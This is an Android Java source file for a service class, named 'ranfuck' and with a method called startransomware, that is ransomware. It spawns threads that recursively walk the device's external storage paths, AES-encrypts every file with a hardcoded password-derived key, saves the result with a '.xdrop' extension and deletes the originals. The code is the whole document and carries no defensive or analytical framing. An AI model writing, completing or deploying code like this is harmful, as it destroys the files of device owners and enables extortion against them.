package com.velociraptor.raptor;



import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class ranfuck extends Service {

    private static final String salt = "t784";
    private static final String cryptPassword = "jack";
    String expath = Environment.getExternalStorageDirectory().getAbsolutePath();
    String TAG = "PhoneActivityTAG";


    public ranfuck() {
    }

    public int startransomware(){

        final String expath = Environment.getExternalStorageDirectory().getAbsolutePath();

        Runnable r = new Runnable() {
            @Override
            public void run() {
                try {
                    listf("/storage/emulated/0/");
                    Log.i(TAG, "emulat");
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                }

            }
        };
        // start the thread
        Thread cry = new Thread(r);
        cry.start();

        Runnable p = new Runnable() {
            @Override
            public void run() {
                try {
                    listf("/storage/sdcard0/");
                    Log.i(TAG, "sccard00");
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                }

            }
        };
        Thread hry = new Thread(p);
        hry.start();

        Runnable a = new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "encption");
                    listf(expath);
                    Log.i(TAG, "expath");
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                }
            }
        };
        Thread gry = new Thread(a);
        gry.start();

        Runnable b = new Runnable() {
            @Override
            public void run() {
                try {
                    listf("/storage/sdcard/");
                    Log.i(TAG, "/scccc");
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
        Thread kry = new Thread(b);
        kry.start();
        return Service.START_NOT_STICKY;

    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static List<File> listf(String directoryName) throws IOException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException {
        File directory = new File(directoryName);

        List<File> resultList = new ArrayList<>();

        // get all the files from a directory
        File[] fList = directory.listFiles();
        // this was missing
        if (fList == null) {
            return null;
        }
        resultList.addAll(Arrays.asList(fList));
        for (File file : fList) {
            if (file.isFile()) {
                encryptfile(file.getAbsolutePath(), cryptPassword);
                DeleteRecursive(file.getAbsolutePath());
                try {
                    encryptfile(file.getAbsolutePath(), cryptPassword);
                    DeleteRecursive(file.getAbsolutePath());
                } catch (Exception ex) {

                }
            } else if (file.isDirectory()) {
                // ask here if it was null
                List<File> files = listf(file.getAbsolutePath());
                if (files != null) {
                    resultList.addAll(files);
                }
            }
        }
        //System.out.println(fList);
        return resultList;
    }



    public static void DeleteRecursive(String filename) {
        File file = new File(filename);
        if (!file.exists())
            return;
        if (!file.isDirectory()) {
            file.delete();
            return;
        }

        String[] files = file.list();
        for (int i = 0; i < files.length; i++) {

            DeleteRecursive(filename + "/" + files[i]);
        }
        file.delete();
    }


    public static void encryptfile(String path, String password) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        FileInputStream fis = new FileInputStream(path);
        FileOutputStream fos = new FileOutputStream(path.concat(".xdrop"));
        byte[] key = (salt + password).getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-1");
        key = sha.digest(key);
        key = Arrays.copyOf(key,16);
        SecretKeySpec sks = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, sks);
        CipherOutputStream cos = new CipherOutputStream(fos, cipher);
        int b;
        byte[] d = new byte[8];
        while((b = fis.read(d)) != -1) {
            cos.write(d, 0, b);
        }
        cos.flush();
        cos.close();
        fis.close();
    }


}